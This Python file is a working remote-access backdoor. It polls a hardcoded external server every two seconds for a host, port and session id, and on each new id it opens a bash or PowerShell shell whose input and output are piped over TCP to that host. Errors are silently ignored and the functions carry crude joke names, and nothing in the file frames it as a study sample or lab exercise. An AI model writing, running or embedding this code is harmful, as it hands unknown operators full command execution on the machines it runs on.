import asyncio
import aiohttp # type: ignore
import sys
import os

SLEEP_PERIOD_SECS = 2

URL_STATUS = "http://erzhanoriez.winogrona.cc/data/status"

SHELL = ""
if sys.platform == 'win32':
    SHELL = "powershell.exe"
else:
    SHELL = "bash"

async def revshell(host: str, port: int) -> None:
    shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    (reader, writer) = await asyncio.open_connection(host, port)

    future_readclosed = asyncio.get_running_loop().create_future()

    async def stdin_task():
        while True:
            data = await reader.read(1024)
            shell.stdin.write(data)
        
    async def stderr_task():
        while True:
            data = await shell.stderr.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)

    async def stdout_task():
        while True:
            data = await shell.stdout.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)
    
    shell_coros = [stdin_task(), stdout_task(), stderr_task()]
    shell_tasks = [asyncio.create_task(coro) for coro in shell_coros]

    await future_readclosed
    for task in shell_tasks:
        task.cancel()

    reader.feed_eof()
    writer.close()

async def струи_СЭКСА():
    cur_stream_id = -1
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(URL_STATUS) as resp:
                    (host, port, stream_id) = (await resp.text()).split(":")
                    port = int(port)
                    stream_id = int(stream_id)

                    if stream_id > cur_stream_id:
                        asyncio.create_task(revshell(host, port))
                        cur_stream_id = stream_id

        except Exception as e:
            pass
            
        await asyncio.sleep(SLEEP_PERIOD_SECS)

def seks_installer():
    print(sys.executable)

if __name__ == '__main__':
    seks_installer()
    asyncio.run(струи_СЭКСА())